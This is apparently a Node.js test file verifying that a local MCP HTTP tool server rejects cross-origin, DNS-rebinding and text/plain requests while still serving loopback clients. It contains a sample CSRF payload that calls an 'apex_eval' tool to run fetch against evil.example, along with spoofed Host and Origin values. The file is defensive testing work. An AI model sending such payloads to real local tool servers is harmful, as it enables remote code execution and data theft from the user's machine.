// mcp-http-origin.test.mjs — apex-tools `serve-http` refuses cross-origin / DNS-rebound requests.
// MCP 2025-06-18 transports, Security Warning: servers MUST validate Origin
// (https://modelcontextprotocol.io/specification/2025-06-18/basic/transports). In-process, mock mode:
// one node process, no tool spawned, no network beyond 127.0.0.1.
import { test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";

process.env.APEX_MCP_MOCK = "1";
process.env.APEX_MCP_HTTP_PORT = "0";
const { cmdServeHttp, httpRefusal } = await import("../../tools/mcp/apex-tools-mcp.mjs");

// http.request, not fetch: fetch may not forge Host, and the rebinding case needs it.
function post(port, headers, body) {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: "127.0.0.1", port, path: "/mcp", method: "POST", headers }, (res) => {
      let data = "";
      res.setEncoding("utf8");
      res.on("data", (c) => { data += c; });
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on("error", reject);
    req.end(body);
  });
}

const LIST = JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list" });
// The hunter's probe (scratch/hunt3-hostile-v2/mcp-http-csrf.sh): a CORS "simple" request.
const ATTACK = JSON.stringify({
  jsonrpc: "2.0", id: 2, method: "tools/call",
  params: { name: "apex_eval", arguments: { track: "monza", expr: 'fetch("https://evil.example/x")' } },
});

test("httpRefusal: loopback Host, absent/loopback Origin and JSON pass; anything else is named", () => {
  const r = (headers, method = "POST") => httpRefusal({ method, headers });
  assert.equal(r({ host: "127.0.0.1:3713", "content-type": "application/json" }), "");
  assert.equal(r({ host: "localhost:3713", "content-type": "application/json; charset=utf-8" }), "");
  assert.equal(r({ host: "[::1]:3713", origin: "http://localhost:3456", "content-type": "application/json" }), "");
  assert.equal(r({ host: "127.0.0.1:3713" }, "GET"), "");
  assert.match(r({ host: "rebind.evil.example:3713", "content-type": "application/json" }), /Host/);
  assert.match(r({ host: "127.0.0.1.evil.example", "content-type": "application/json" }), /Host/);
  assert.match(r({ "content-type": "application/json" }), /Host/);
  for (const origin of ["https://evil.example", "null", "http://127.0.0.1.evil.example", "http://localhost:1/x", "file://"]) {
    assert.match(r({ host: "127.0.0.1:3713", origin, "content-type": "application/json" }), /Origin/, origin);
  }
  for (const ct of [undefined, "text/plain", "application/x-www-form-urlencoded", "multipart/form-data", "application/jsonp"]) {
    assert.match(r({ host: "127.0.0.1:3713", "content-type": ct }), /Content-Type/, String(ct));
  }
});

test("serve-http: the probe's cross-origin request is 403, a local MCP client still gets 200", async () => {
  const srv = cmdServeHttp();
  try {
    if (!srv.listening) await new Promise((resolve) => srv.once("listening", resolve));
    const { port } = srv.address();
    const local = { host: `127.0.0.1:${port}`, "content-type": "application/json" };

    // Attacker: foreign Origin + text/plain (no preflight) + rebinding Host → refused before handleRpc.
    for (const [headers, body] of [
      [{ origin: "https://evil.example", "content-type": "text/plain", host: `rebind.evil.example:${port}` }, LIST],
      [{ origin: "https://evil.example", "content-type": "text/plain" }, ATTACK],
      [{ ...local, origin: "https://evil.example" }, ATTACK],
      [{ ...local, host: `rebind.evil.example:${port}` }, ATTACK],
      [{ ...local, "content-type": "text/plain" }, ATTACK],
    ]) {
      const res = await post(port, headers, body);
      assert.equal(res.status, 403, JSON.stringify(headers));
      assert.equal(res.headers["access-control-allow-origin"], undefined);
      assert.match(JSON.parse(res.body).error.message, /^Forbidden: /);
      assert.doesNotMatch(res.body, /argv|apex_graph_parity/, "nothing from handleRpc leaks");
    }

    // Local MCP client: no Origin, loopback Host, JSON body → the catalog, as before.
    const ok = await post(port, local, LIST);
    assert.equal(ok.status, 200, ok.body);
    const names = JSON.parse(ok.body).result.tools.map((t) => t.name);
    assert.ok(names.includes("apex_graph_parity"), names);
    // A loopback page (the game on :3456) and `localhost` are local too.
    const page = await post(port, { ...local, host: `localhost:${port}`, origin: "http://localhost:3456" }, LIST);
    assert.equal(page.status, 200, page.body);
  } finally {
    await new Promise((resolve) => srv.close(resolve));
  }
});
